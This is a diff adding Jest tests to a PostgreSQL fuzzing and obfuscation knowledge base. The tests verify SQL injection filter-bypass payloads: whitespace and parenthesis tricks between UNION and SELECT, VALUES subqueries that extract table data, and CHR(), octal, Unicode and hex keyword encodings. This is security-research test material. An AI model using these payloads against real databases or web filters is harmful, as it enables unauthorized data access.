@@ -83,6 +83,39 @@ describe("PostgreSQL Fuzzing and Obfuscation", () => {
       const usernames = rows.map((r) => (r as { username: string }).username);
       expect(usernames).toContain("injected");
     });
+
+    test("Unicode letters in dollar quote tags (Greek)", async () => {
+      // PostgreSQL allows Unicode letters in tags (follows identifier rules)
+      const { rows } = await directSQLExpectSuccess("SELECT $α$admin$α$ as val");
+      expect((rows[0] as { val: string }).val).toBe("admin");
+    });
+
+    test("Unicode letters in dollar quote tags (Japanese)", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT $日$admin$日$ as val");
+      expect((rows[0] as { val: string }).val).toBe("admin");
+    });
+
+    test("Unicode letters in dollar quote tags (emoji)", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT $💀$admin$💀$ as val");
+      expect((rows[0] as { val: string }).val).toBe("admin");
+    });
+
+    test("Tag starting with digit fails", async () => {
+      // Tags follow identifier rules - cannot start with digit
+      const { success } = await directSQL("SELECT $1tag$admin$1tag$ as val");
+      expect(success).toBe(false);
+    });
+
+    test("Tag with underscore prefix works", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT $_tag$admin$_tag$ as val");
+      expect((rows[0] as { val: string }).val).toBe("admin");
+    });
+
+    test("Tags are case-sensitive", async () => {
+      // $Tag$ != $tag$ - must match exactly
+      const { success } = await directSQL("SELECT $Tag$admin$tag$ as val");
+      expect(success).toBe(false);
+    });
   });
 
   /**
@@ -319,6 +352,140 @@ describe("PostgreSQL Fuzzing and Obfuscation", () => {
 
   /**
    * @kb-entry postgresql/fuzzing-obfuscation
+   * @kb-section Space Bypass Between UNION and SELECT
+   *
+   * Lesser-known techniques to bypass space filtering between UNION and SELECT.
+   * These are alternatives to the well-known UNION-comment-SELECT pattern.
+   */
+  describe("Space bypass between UNION and SELECT", () => {
+    test("Tab character (\\t) as separator", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION\tSELECT 999, 'tab_bypass'"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("tab_bypass");
+    });
+
+    test("Newline (\\n) as separator", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION\nSELECT 999, 'newline_bypass'"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("newline_bypass");
+    });
+
+    test("Carriage return + newline (\\r\\n) as separator", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION\r\nSELECT 999, 'crlf_bypass'"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("crlf_bypass");
+    });
+
+    test("Form feed (\\f) as separator", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION\fSELECT 999, 'formfeed_bypass'"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("formfeed_bypass");
+    });
+
+    test("Vertical tab (\\v) does NOT work as separator", async () => {
+      // Unlike other whitespace, vertical tab (0x0B) is NOT valid in PostgreSQL
+      const { success } = await directSQL(
+        "SELECT id, username FROM users WHERE id = 1 UNION\vSELECT 999, 'vtab_bypass'"
+      );
+      expect(success).toBe(false);
+    });
+
+    test("Parentheses around SELECT (no space needed)", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION(SELECT 999, 'paren_bypass')"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("paren_bypass");
+    });
+
+    test("VALUES clause (avoids SELECT keyword entirely)", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION VALUES(999, 'values_bypass')"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("values_bypass");
+    });
+
+    test("UNION ALL with parentheses (no space)", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION ALL(SELECT 999, 'unionall_paren')"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("unionall_paren");
+    });
+
+    test("Multiple mixed whitespace characters", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION\n\t\r\nSELECT 999, 'mixed_ws'"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("mixed_ws");
+    });
+
+    test("Double parentheses around SELECT", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION((SELECT 999, 'double_paren'))"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("double_paren");
+    });
+
+    test("Subquery with parentheses (bypasses UNION SELECT pattern)", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION(SELECT * FROM(SELECT 999, 'subq_bypass')t)"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("subq_bypass");
+    });
+
+    test("VALUES with multiple rows", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION VALUES(998, 'val1'),(999, 'val2')"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("val1");
+      expect(usernames).toContain("val2");
+    });
+
+    test("Plus sign after UNION (PostgreSQL specific)", async () => {
+      // In some contexts, UNION+SELECT might work differently
+      // Testing UNION followed by expression in parentheses
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION(SELECT+999, 'plus_bypass')"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("plus_bypass");
+    });
+
+    test("VALUES with subquery to extract data from table", async () => {
+      // VALUES can use subqueries to extract actual table data!
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION VALUES(999, (SELECT username FROM users WHERE id = 2))"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      // Should contain the username from user id=2
+      expect(usernames.length).toBeGreaterThan(1);
+    });
+
+    test("VALUES with multiple subqueries", async () => {
+      // Both columns can be subqueries
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION VALUES((SELECT id FROM users WHERE username='admin'), (SELECT username FROM users WHERE id = 2))"
+      );
+      expect(rows.length).toBeGreaterThan(1);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/fuzzing-obfuscation
    * @kb-section DO $$ Block WAF Bypass
    */
   describe("DO $$ Block WAF Bypass", () => {
@@ -355,6 +522,289 @@ describe("PostgreSQL Fuzzing and Obfuscation", () => {
         END $$;
       `);
       expect(success).toBe(true);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/fuzzing-obfuscation
+   * @kb-section String Representation Alternatives - Extended
+   */
+  describe("String representation alternatives - extended", () => {
+    test("Escape string octal syntax", async () => {
+      // E'\141\144\155\151\156' = 'admin' in octal
+      const { rows } = await directSQLExpectSuccess("SELECT E'\\141\\144\\155\\151\\156' as str");
+      expect((rows[0] as { str: string }).str).toBe("admin");
+    });
+
+    test("Unicode escape syntax", async () => {
+      // U&'\0061\0064\006D\0069\006E' = 'admin'
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT U&'\\0061\\0064\\006D\\0069\\006E' as str"
+      );
+      expect((rows[0] as { str: string }).str).toBe("admin");
+    });
+
+    test("Custom UESCAPE character", async () => {
+      // Use ! instead of backslash as escape character
+      const { rows } = await directSQLExpectSuccess("SELECT U&'!0061dmin' UESCAPE '!' as str");
+      expect((rows[0] as { str: string }).str).toBe("admin");
+    });
+
+    test("convert_from in WHERE clause", async () => {
+      // Using convert_from with hex in injection context
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE username = convert_from('\\x61646d696e'::bytea, 'UTF8')"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("Combined encoding techniques", async () => {
+      // Mix hex and chr
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE username = convert_from('\\x61'::bytea, 'UTF8') || CHR(100)||CHR(109)||CHR(105)||CHR(110)"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/fuzzing-obfuscation
+   * @kb-section Numeric Representation - Extended
+   */
+  describe("Numeric representation - extended", () => {
+    test("Scientific notation 1e0", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = 1e0");
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("Scientific notation 0.1e1", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = 0.1e1");
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("Scientific notation with UNION", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 0e0 UNION SELECT 999, 'scientific'"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("scientific");
+    });
+
+    test("Type constructor function int4()", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = int4('1')");
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("ABS() for number generation", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = ABS(-1)");
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("LENGTH() for number generation", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE id = LENGTH('x')");
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("ASCII() arithmetic for number", async () => {
+      // ASCII('1') = 49, so ASCII('1') - 48 = 1
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE id = ASCII('1') - 48"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/fuzzing-obfuscation
+   * @kb-section Boolean Representation Bypasses
+   */
+  describe("Boolean representation bypasses", () => {
+    test("'yes'::boolean for true", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE id = 999 OR 'yes'::boolean"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("'on'::boolean for true", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE id = 999 OR 'on'::boolean"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("'t'::boolean for true", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE id = 999 OR 't'::boolean"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("'no'::boolean for false", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT 'no'::boolean as val");
+      expect((rows[0] as { val: boolean }).val).toBe(false);
+    });
+
+    test("'off'::boolean for false", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT 'off'::boolean as val");
+      expect((rows[0] as { val: boolean }).val).toBe(false);
+    });
+
+    test("BOOL 't' syntax", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE id = 999 OR BOOL 't'"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/fuzzing-obfuscation
+   * @kb-section Pattern Matching Alternatives
+   */
+  describe("Pattern matching alternatives", () => {
+    test("STRPOS instead of LIKE", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE STRPOS(username, 'admin') > 0"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("starts-with operator (^@) for PG11+", async () => {
+      // ^@ is a starts-with operator added in PostgreSQL 11
+      const { rows } = await directSQLExpectSuccess("SELECT * FROM users WHERE username ^@ 'adm'");
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("POSITION alternative to STRPOS", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE POSITION('admin' IN username) > 0"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/fuzzing-obfuscation
+   * @kb-section Schema-Qualified Functions
+   */
+  describe("Schema-qualified functions for bypass", () => {
+    test("pg_catalog.length() bypass", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE pg_catalog.length(username) > 0"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("pg_catalog.upper() bypass", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE pg_catalog.upper(username) = 'ADMIN'"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("pg_catalog.substr() bypass", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT * FROM users WHERE pg_catalog.substr(username, 1, 1) = 'a'"
+      );
+      expect(rows.length).toBeGreaterThan(0);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/fuzzing-obfuscation
+   * @kb-section CHR() Helper Functions
+   */
+  describe("CHR() encoding helpers", () => {
+    test("Generate CHR() sequence for string", async () => {
+      // Helper query to convert any string to CHR() sequence
+      const { rows } = await directSQLExpectSuccess(`
+        SELECT string_agg('CHR(' || ascii(ch) || ')', '||')
+        FROM regexp_split_to_table('SELECT', '') AS ch
+      `);
+      const chrSequence = (rows[0] as { string_agg: string }).string_agg;
+      expect(chrSequence).toBe("CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)");
+    });
+
+    test("Execute CHR()-constructed keyword", async () => {
+      // Verify the CHR sequence actually works
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84) as keyword"
+      );
+      expect((rows[0] as { keyword: string }).keyword).toBe("SELECT");
+    });
+
+    test("CHR() sequence for UNION keyword", async () => {
+      const { rows } = await directSQLExpectSuccess(`
+        SELECT string_agg('CHR(' || ascii(ch) || ')', '||')
+        FROM regexp_split_to_table('UNION', '') AS ch
+      `);
+      const chrSequence = (rows[0] as { string_agg: string }).string_agg;
+      expect(chrSequence).toBe("CHR(85)||CHR(78)||CHR(73)||CHR(79)||CHR(78)");
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/fuzzing-obfuscation
+   * @kb-section Characters After SELECT Without Space
+   */
+  describe("Characters after SELECT without space", () => {
+    test("Quote directly after SELECT", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT'test' as val");
+      expect((rows[0] as { val: string }).val).toBe("test");
+    });
+
+    test("Dot after SELECT (decimal number)", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT.1e1 as val");
+      // Driver may return as string; check numeric value
+      expect(Number((rows[0] as { val: string | number }).val)).toBe(1);
+    });
+
+    test("Minus after SELECT (unary)", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT-1 as val");
+      expect((rows[0] as { val: number }).val).toBe(-1);
+    });
+
+    test("Plus after SELECT (unary)", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT+1 as val");
+      expect((rows[0] as { val: number }).val).toBe(1);
+    });
+
+    test("Parentheses after SELECT", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT(1+1) as val");
+      expect((rows[0] as { val: number }).val).toBe(2);
+    });
+
+    test("At sign after SELECT (absolute value)", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT@(-5) as val");
+      expect((rows[0] as { val: number }).val).toBe(5);
+    });
+  });
+
+  /**
+   * @kb-entry postgresql/fuzzing-obfuscation
+   * @kb-section Parentheses as Space Alternative
+   */
+  describe("Parentheses as space alternative", () => {
+    test("SELECT(column)FROM pattern", async () => {
+      const { rows } = await directSQLExpectSuccess("SELECT(username)FROM users WHERE id = 1");
+      expect(rows.length).toBeGreaterThan(0);
+    });
+
+    test("Nested parentheses in UNION", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION((SELECT 999, 'nested'))"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("nested");
+    });
+
+    test("SELECT * FROM (SELECT ...) pattern", async () => {
+      const { rows } = await directSQLExpectSuccess(
+        "SELECT id, username FROM users WHERE id = 1 UNION(SELECT * FROM(SELECT 999, 'from_subq')t)"
+      );
+      const usernames = rows.map((r) => (r as { username: string }).username);
+      expect(usernames).toContain("from_subq");
     });
   });
 });
